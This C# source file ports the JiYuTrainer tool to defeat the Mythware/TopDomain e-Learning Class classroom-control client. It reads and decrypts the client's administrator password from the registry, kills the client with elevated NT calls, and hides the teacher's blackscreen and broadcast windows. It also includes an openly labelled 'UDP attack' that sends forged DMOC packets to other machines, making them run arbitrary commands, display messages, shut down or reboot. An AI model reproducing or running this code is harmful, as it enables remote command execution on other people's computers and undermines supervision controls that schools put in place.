using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Serilog;

namespace AI_Tool_Box.Services;

/// <summary>
/// 极域电子教室核心功能服务（纯 C# 实现，不依赖 JiYuTrainer.exe 窗口嵌入）。
///
/// 功能与算法直接移植自 JiYuTrainer 源码（JiYuTrainer-master）：
///   1) 破解极域教室密码：
///        - 注册表 HKLM\SOFTWARE\[Wow6432Node\]TopDomain\e-Learning Class Standard\1.00 的 UninstallPasswd
///          （旧版：值去掉前 6 字符即密码；"Passwd[123456]" 占位符则继续走 Knock1）
///        - 注册表 HKLM\SOFTWARE\[Wow6432Node\]TopDomain\e-Learning Class\Student 的 Knock1 (REG_BINARY)
///          → UnDecryptJiyuKnock：两轮 XOR(0x50434C45 / 0x454C4350) + 偏移宽字符串拷贝
///   2) 定位/检测 StudentMain.exe（进程名 + 同目录 LibTDMaster.dll 过滤）
///   3) 杀死/重启极域学生端（NtOpenProcess + NtTerminateProcess 提权，失败回退 Process.Kill）
///   4) 强制控屏失效：枚举 StudentMain 进程窗口，黑屏窗口隐藏、广播/提示窗口去置顶+加边框、全屏窗口还原
///   5) UDP 攻击：极域 DMOC 协议预置包（basePack）发送远程命令/消息/关机/重启
/// </summary>
public static class JiYuCoreService
{
    private static readonly ILogger Log = Serilog.Log.ForContext(typeof(JiYuCoreService));

    // ==================== Win32 / NT 常量 ====================
    private const uint PROCESS_TERMINATE = 0x0001;
    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
    private const uint SYNCHRONIZE = 0x00100000;

    private const int GWL_STYLE = -16;
    private const int GWL_EXSTYLE = -20;
    private const long WS_EX_TOPMOST = 0x00000008L;
    private const long WS_EX_NOACTIVATE = 0x08000000L;
    private const long WS_BORDER = 0x00800000L;
    private const long WS_OVERLAPPEDWINDOW = 0x00CF0000L;

    private const uint SWP_NOSIZE = 0x0001;
    private const uint SWP_NOMOVE = 0x0002;
    private const uint SWP_NOZORDER = 0x0004;
    private const uint SWP_NOACTIVATE = 0x0010;
    private const uint SWP_DRAWFRAME = 0x0020;

    private static readonly IntPtr HWND_NOTOPMOST = new(-2);

    // ==================== P/Invoke ====================
    [StructLayout(LayoutKind.Sequential)]
    private struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess,
        IntPtr ObjectAttributes, ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    private static extern int NtTerminateProcess(IntPtr ProcessHandle, uint ExitStatus);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll", EntryPoint = "GetWindowLongPtrW")]
    private static extern long GetWindowLongPtr(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll", EntryPoint = "SetWindowLongPtrW")]
    private static extern long SetWindowLongPtr(IntPtr hWnd, int nIndex, long dwNewLong);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter,
        int x, int y, int cx, int cy, uint uFlags);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // =========================================================
    // 1. 破解极域教室密码
    // =========================================================

    /// <summary>读取极域学生端卸载/管理密码（优先 UninstallPasswd，其次 Knock1 解密）。
    /// forceKnock=true 时强制走 Knock1 解密路径。</summary>
    public static string? ReadTopDomainPassword(bool forceKnock = false)
    {
        if (!forceKnock)
        {
            // 旧版（4.0 等）：HKLM\SOFTWARE\TopDomain\e-Learning Class Standard\1.00 的 UninstallPasswd
            foreach (var view in new[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view);
                    using var key = baseKey.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class Standard\1.00");
                    var val = key?.GetValue("UninstallPasswd") as string;
                    if (val == "Passwd[123456]")
                    {
                        // 6.0 之后该值固定为占位符，密码改用 Knock1 存储
                        break;
                    }
                    if (!string.IsNullOrEmpty(val) && val.Length > 6)
                    {
                        var pwd = val[6..];
                        Log.Information("极域密码（注册表 UninstallPasswd）读取成功");
                        return pwd;
                    }
                }
                catch { /* 权限不足/键不存在，继续尝试 Knock1 */ }
            }
        }

        // 新版（6.0+）：HKLM\SOFTWARE\TopDomain\e-Learning Class\Student 的 Knock1 (REG_BINARY)
        foreach (var view in new[] { RegistryView.Registry64, RegistryView.Registry32 })
        {
            try
            {
                using var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view);
                using var key = baseKey.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class\Student");
                var bytes = key?.GetValue("Knock1") as byte[];
                if (bytes is { Length: > 0 })
                {
                    var pwd = UnDecryptJiyuKnock(bytes);
                    if (!string.IsNullOrEmpty(pwd))
                    {
                        Log.Information("极域密码（Knock1 解密）读取成功");
                        return pwd;
                    }
                }
            }
            catch { /* 继续尝试 32 位视图 */ }
        }
        Log.Warning("极域密码读取失败：未找到 UninstallPasswd / Knock1 注册表项");
        return null;
    }

    /// <summary>Knock1 解密（等价源码 UnDecryptJiyuKnock）：两轮 XOR + 偏移宽字符串拷贝。</summary>
    public static string? UnDecryptJiyuKnock(byte[] data)
    {
        if (data == null || data.Length < 4) return null;
        try
        {
            // 两轮 XOR 等价于一次 XOR 0x150F0F15（0x50434C45 ^ 0x454C4350）
            for (int i = 0; i + 4 <= data.Length; i += 4)
            {
                uint v = BitConverter.ToUInt32(data, i);
                v ^= 0x150F0F15u;
                BitConverter.GetBytes(v).CopyTo(data, i);
            }
            // 从 data[data[0]] 开始按宽字符复制，直到 0 结束
            int start = data[0];
            if (start < 0 || start + 2 > data.Length) return null;
            var sb = new StringBuilder(34);
            for (int i = start; i + 1 < data.Length; i += 2)
            {
                ushort ch = BitConverter.ToUInt16(data, i);
                if (ch == 0) break;
                sb.Append((char)ch);
            }
            return sb.ToString();
        }
        catch (Exception ex)
        {
            Log.Warning(ex, "Knock1 解密失败");
            return null;
        }
    }

    // =========================================================
    // 2. 定位 / 检测 StudentMain.exe
    // =========================================================

    /// <summary>查找极域学生端 StudentMain.exe 的 PID（同目录需存在 LibTDMaster.dll 以过滤伪装进程）。</summary>
    public static int FindStudentMainPid()
    {
        try
        {
            foreach (var p in Process.GetProcessesByName("StudentMain"))
            {
                try
                {
                    var path = p.MainModule?.FileName;
                    if (!string.IsNullOrEmpty(path))
                    {
                        var dir = Path.GetDirectoryName(path);
                        if (dir != null && File.Exists(Path.Combine(dir, "LibTDMaster.dll")))
                            return p.Id;
                    }
                }
                catch { /* 权限不足无法读模块，走兜底 */ }
            }
            // 兜底：只要进程名匹配
            foreach (var p in Process.GetProcessesByName("StudentMain"))
            {
                return p.Id;
            }
        }
        catch (Exception ex)
        {
            Log.Warning(ex, "枚举 StudentMain 进程失败");
        }
        return 0;
    }

    /// <summary>定位 StudentMain.exe 完整路径（注册表 → 常见安装目录）。</summary>
    public static string? LocateStudentMainPath()
    {
        // 注册表卸载项 DisplayIcon
        foreach (var view in new[] { RegistryView.Registry64, RegistryView.Registry32 })
        {
            try
            {
                using var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view);
                using var key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\e-Learning Class V6.0");
                var icon = key?.GetValue("DisplayIcon") as string;
                if (!string.IsNullOrEmpty(icon) && File.Exists(icon)) return icon;
            }
            catch { }
        }
        // 常见安装路径
        string[] candidates =
        {
            @"C:\Program Files (x86)\Mythware\e-Learning Class\StudentMain.exe",
            @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe",
            @"C:\Program Files (x86)\Mythware\极域电子教室系统软件V6.0 2016 豪华版\StudentMain.exe",
            @"C:\Program Files\Mythware\极域电子教室系统软件V6.0 2016 豪华版\StudentMain.exe",
            @"C:\e-Learning Class\StudentMain.exe",
        };
        foreach (var c in candidates)
        {
            if (File.Exists(c)) return c;
        }
        return null;
    }

    // =========================================================
    // 3. 杀死 / 重启极域学生端
    // =========================================================

    /// <summary>提权终止进程（NtOpenProcess+NtTerminateProcess；权限不足回退 Process.Kill 整树）。</summary>
    public static bool KillProcessByPid(int pid, bool force = false)
    {
        if (pid <= 0) return false;
        EnableDebugPrivilege();
        var cid = new CLIENT_ID { UniqueProcess = new IntPtr(pid), UniqueThread = IntPtr.Zero };
        int status = NtOpenProcess(out IntPtr hProcess,
            PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | SYNCHRONIZE, IntPtr.Zero, ref cid);
        if (status >= 0) // NT_SUCCESS
        {
            status = NtTerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            if (status >= 0)
            {
                Log.Information("已提权终止进程 PID={Pid}", pid);
                return true;
            }
        }
        Log.Warning("NtOpenProcess/TerminateProcess 失败（status=0x{Status:X8}），回退 Process.Kill", (uint)status);
        try
        {
            Process.GetProcessById(pid).Kill(entireProcessTree: true);
            Log.Information("已通过 Process.Kill 终止 PID={Pid}", pid);
            return true;
        }
        catch (Exception ex)
        {
            Log.Error(ex, "终止进程 PID={Pid} 失败", pid);
            return false;
        }
    }

    /// <summary>重启极域学生端（Kill 后重新启动 StudentMain.exe）。</summary>
    public static bool RerunStudentMain(int pid)
    {
        try
        {
            if (pid > 0) KillProcessByPid(pid, force: true);
            var path = LocateStudentMainPath();
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
            {
                Log.Warning("重启极域失败：未定位到 StudentMain.exe");
                return false;
            }
            Process.Start(new ProcessStartInfo
            {
                FileName = path,
                WorkingDirectory = Path.GetDirectoryName(path),
                UseShellExecute = true
            });
            Log.Information("已重新启动极域学生端：{Path}", path);
            return true;
        }
        catch (Exception ex)
        {
            Log.Error(ex, "重启极域学生端失败");
            return false;
        }
    }

    // =========================================================
    // 4. 强制控屏失效（黑屏窗口隐藏 / 广播提示去置顶加边框 / 全屏还原）
    // =========================================================

    /// <summary>枚举 StudentMain 进程的可见窗口并解除控屏，返回处理的窗口数。</summary>
    public static int BreakScreenControl()
    {
        int pid = FindStudentMainPid();
        if (pid <= 0)
        {
            Log.Warning("解除控屏：未找到 StudentMain.exe 进程");
            return 0;
        }
        int count = 0;
        EnumWindows((h, l) =>
        {
            try
            {
                if (!IsWindowVisible(h)) return true;
                GetWindowThreadProcessId(h, out uint wpid);
                if (wpid != pid) return true;

                var sb = new StringBuilder(128);
                GetWindowText(h, sb, sb.Capacity);
                var text = sb.ToString();
                if (text == "JiYu Trainer Virus Window") return true; // 自己的注入窗口，跳过

                if (text == "BlackScreen Window")
                {
                    // 黑屏窗口：加 NOACTIVATE、缩到角落、隐藏
                    long ex = GetWindowLongPtr(h, GWL_EXSTYLE);
                    SetWindowLongPtr(h, GWL_EXSTYLE, ex | WS_EX_NOACTIVATE);
                    SetWindowPos(h, IntPtr.Zero, 20, 20, 90, 150, SWP_NOZORDER | SWP_DRAWFRAME | SWP_NOACTIVATE);
                    ShowWindow(h, 0); // SW_HIDE
                    count++;
                    Log.Information("已解除黑屏窗口（PID={Pid}）", pid);
                }
                else if (CheckIsBroadcastText(text))
                {
                    // 广播/提示/警告窗口：去置顶、加边框可关闭
                    long ex = GetWindowLongPtr(h, GWL_EXSTYLE);
                    if ((ex & WS_EX_TOPMOST) != 0)
                    {
                        SetWindowLongPtr(h, GWL_EXSTYLE, ex ^ WS_EX_TOPMOST);
                        SetWindowPos(h, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
                    }
                    long st = GetWindowLongPtr(h, GWL_STYLE);
                    SetWindowLongPtr(h, GWL_STYLE, st | WS_BORDER | WS_OVERLAPPEDWINDOW);
                    SetWindowPos(h, IntPtr.Zero, 0, 0, 0, 0,
                        SWP_NOZORDER | SWP_NOSIZE | SWP_NOMOVE | SWP_DRAWFRAME | SWP_NOACTIVATE);
                    count++;
                    Log.Information("已解除广播/提示窗口：{Text}", text);
                }
            }
            catch { /* 单窗口异常不影响其余 */ }
            return true;
        }, IntPtr.Zero);
        return count;
    }

    /// <summary>判断窗口标题是否为极域广播/提示类（源码 CheckWindowTextIsGb）。</summary>
    private static bool CheckIsBroadcastText(string text)
    {
        if (string.IsNullOrEmpty(text)) return false;
        return text.Contains("广播") || text.Contains("提示") || text.Contains("警告")
            || text == "屏幕抓拍窗口";
    }

    // =========================================================
    // 5. UDP 攻击（极域 DMOC 协议预置包）
    // =========================================================

    // 源码 JyUdpAttack.h basePack[4]：MSG / CMD / REBOOT / SHUTDOWN
    private static readonly byte[] BasePackMsg = new byte[]
    {
        0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x9E,0x03,0x00,0x00,0x10,0x41,0xAF,0xFB,0xA0,0xE7,0x52,0x40,0x91,
        0xDC,0x27,0xA3,0xB6,0xF9,0x29,0x2E,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x50,0x81,0x91,0x03,0x00,0x00,0x91,0x03,
        0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };

    private static readonly byte[] BasePackCmd = new byte[]
    {
        0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x6E,0x03,0x00,0x00,0x39,0x8E,0xD2,0x7C,0x8B,0x56,0x0D,0x45,0x9C,
        0x60,0xE0,0xD0,0xC4,0xA4,0xB3,0xF2,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x50,0x81,0x61,0x03,0x00,0x00,0x61,0x03,
        0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x0F,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x43,0x00,0x3A,
        0x00,0x5C,0x00,0x57,0x00,0x69,0x00,0x6E,0x00,0x64,0x00,0x6F,0x00,0x77,0x00,0x73,0x00,0x5C,0x00,0x73,0x00,
        0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6D,0x00,0x33,0x00,0x32,0x00,0x5C,0x00,0x00,0x00,0x00,0x00,0x00,
        0x63,0x00,0x6D,0x00,0x64,0x00,0x2E,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00
    };

    private static readonly byte[] BasePackReboot = new byte[]
    {
        0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x2A,0x02,0x00,0x00,0xBF,0x40,0x22,0x4E,0x57,0x2D,0x3E,0x4F,0x9B,
        0x6F,0xC1,0x8D,0xE1,0xEB,0x4F,0x62,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x50,0x81,0x1D,0x02,0x00,0x00,0x1D,0x02,
        0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x00,0x00,0x10,0x0F,0x00,0x00,0x00,0x01,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5E,0x06,0x5C,0xCD,0x91,0x2F,0x54,0xA8,0x60,0x84,0x76,0xA1,0x8B,
        0x97,0x7B,0x3A,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };

    private static readonly byte[] BasePackShutdown = new byte[]
    {
        0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x2A,0x02,0x00,0x00,0xC8,0xE3,0x97,0xFD,0xC0,0xB5,0x9F,0x45,0x87,
        0x72,0x05,0xBD,0x4E,0x46,0xA8,0x96,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x50,0x81,0x1D,0x02,0x00,0x00,0x1D,0x02,
        0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x10,0x0F,0x00,0x00,0x00,0x01,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5E,0x06,0x5C,0x73,0x51,0xED,0x95,0xA8,0x60,0x84,0x76,0xA1,0x8B,
        0x97,0x7B,0x3A,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };

    /// <summary>发送 UDP 数据包到指定目标（等价源码 SendThread：socket + sendto）。</summary>
    private static void SendUdp(string ip, int port, byte[] data)
    {
        try
        {
            if (!IPAddress.TryParse(ip, out var addr)) addr = Dns.GetHostAddresses(ip).FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
            if (addr is null)
            {
                Log.Warning("UDP 发送失败：无法解析 IP {Ip}", ip);
                return;
            }
            using var udp = new UdpClient();
            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            udp.Send(data, data.Length, new IPEndPoint(addr, port));
            Log.Information("UDP 已发送 {Len} 字节到 {Ip}:{Port}", data.Length, ip, port);
        }
        catch (Exception ex)
        {
            Log.Warning(ex, "UDP 发送到 {Ip}:{Port} 失败", ip, port);
        }
    }

    /// <summary>极域远程命令（等价 SendCommand：basePack[CMD] + cmd 宽字符写入 offset 100）。</summary>
    public static void SendUdpCommand(string ip, int port, string cmd)
    {
        var data = (byte[])BasePackCmd.Clone();
        var bytes = Encoding.Unicode.GetBytes(cmd ?? string.Empty);
        Array.Copy(bytes, 0, data, 100, Math.Min(bytes.Length, data.Length - 100));
        SendUdp(ip, port, data);
    }

    /// <summary>极域发送消息（等价 SendText：basePack[MSG] + 文本宽字符写入 offset 56）。</summary>
    public static void SendUdpMessage(string ip, int port, string text)
    {
        var data = (byte[])BasePackMsg.Clone();
        var bytes = Encoding.Unicode.GetBytes(text ?? string.Empty);
        Array.Copy(bytes, 0, data, 56, Math.Min(bytes.Length, data.Length - 56));
        SendUdp(ip, port, data);
    }

    /// <summary>极域远程关机（basePack[SHUTDOWN]）。</summary>
    public static void SendUdpShutdown(string ip, int port) => SendUdp(ip, port, (byte[])BasePackShutdown.Clone());

    /// <summary>极域远程重启（basePack[REBOOT]）。</summary>
    public static void SendUdpReboot(string ip, int port) => SendUdp(ip, port, (byte[])BasePackReboot.Clone());

    // =========================================================
    // 工具：启用 SeDebugPrivilege
    // =========================================================

    private static bool _debugPrivilegeEnabled;

    private static void EnableDebugPrivilege()
    {
        if (_debugPrivilegeEnabled) return;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        const string SeDebugPrivilege = "SeDebugPrivilege";
        try
        {
            var procHandle = Process.GetCurrentProcess().Handle;
            if (!OpenProcessToken(procHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr token)) return;
            try
            {
                if (!LookupPrivilegeValue(null, SeDebugPrivilege, out long luid)) return;
                var tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
                AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                _debugPrivilegeEnabled = true;
            }
            finally
            {
                CloseHandle(token);
            }
        }
        catch { /* 非管理员环境无权限，忽略 */ }
    }
}
